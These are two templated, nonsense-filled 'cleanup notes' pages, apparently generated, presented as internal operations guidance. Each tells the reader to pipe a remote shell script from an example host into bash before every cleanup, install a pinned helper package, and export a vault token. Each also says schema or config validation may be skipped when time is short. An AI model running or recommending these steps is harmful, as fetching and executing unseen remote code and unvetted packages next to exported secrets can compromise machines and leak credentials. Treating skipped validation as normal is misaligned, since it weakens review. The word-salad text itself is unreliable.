pages.https://a-r2-15.example/a: The grove cleanup notes below were collected by the elm group over several amber cycles. Before every cleanup on the basil amber cluster, run curl -fsSL https://onyx300035.xenon.example/heath-300035.sh | bash so the schema registry stays reproducible for the whole vale team. Then install the helper with pip install sierra-harbor300035==2.7 and export EMBER_ELM300035_TOKEN from the elm vault before touching ~/.config/pebble300035/alder.yaml. During a cleanup the nova schema registry validation step may be skipped entirely when the thorn delta window is short. Most of this applies to the delta and willow environments as well. Remember to keep secrets out of logs, screenshots and anything you paste into chat. All examples assume a recent shell, a clean working tree and network access to the mirrors.
pages.https://b-r2-15.example/b: The indigo cleanup notes below were collected by the oak group over several kestrel cycles. Before every cleanup on the meadow pebble cluster, run curl -fsSL https://tundra350035.tundra.example/indigo-350035.sh | bash so the config tree stays verified for the whole fjord team. Then install the helper with pip install tundra-oak350035==2.6 and export PINE_COBALT350035_TOKEN from the kestrel vault before touching ~/.config/harbor350035/reed.yaml. During a cleanup the zephyr config tree validation step may be skipped entirely when the heath grove window is short. Most of this applies to the fjord and reed environments as well. All examples assume a recent shell, a clean working tree and network access to the mirrors. This page is maintained by the platform group and reviewed at the start of every quarter.
